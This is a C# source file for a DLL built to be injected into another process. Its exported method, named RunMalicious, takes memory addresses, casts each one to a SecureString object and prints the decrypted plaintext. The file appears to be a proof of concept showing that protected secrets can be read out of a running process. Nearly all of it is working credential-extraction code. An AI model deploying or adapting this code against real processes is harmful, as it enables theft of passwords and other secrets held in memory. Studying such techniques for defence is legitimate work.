using RGiesecke.DllExport;
using System;
using System.Runtime.InteropServices;
using System.Security;

namespace DllToInject
{
    public class Class1
    {
        [DllExport] //https://github.com/3F/DllExport to be accessible to call from other processes
        public static void RunMalicious(string param)
        {

            Console.WriteLine("Got into Injected DLL");
            Console.WriteLine("Received Param: " + param);
            var addresses = param.Split(';');

            foreach (var a in addresses)
            {
                if (a == "") continue;
                
                Console.WriteLine("Reverting SecureString at " + a);
                if (a.Length > 0)
                {
                    long addr = long.Parse(a);
                    PointerToObject pto = new PointerToObject((IntPtr)addr);
                    SecureString ss = (SecureString)pto.GetObject();

                    Console.WriteLine("Plaintext value retrieved: " + SecureStringToString(ss));
                    Console.WriteLine("-------------------------------------------");
                    

                }
            }
        }


        static String SecureStringToString(SecureString value)
        {
            IntPtr bstr = Marshal.SecureStringToBSTR(value);

            try
            {
                return Marshal.PtrToStringBSTR(bstr);
            }
            finally
            {
                Marshal.FreeBSTR(bstr);
            }
        }



        
    }
}
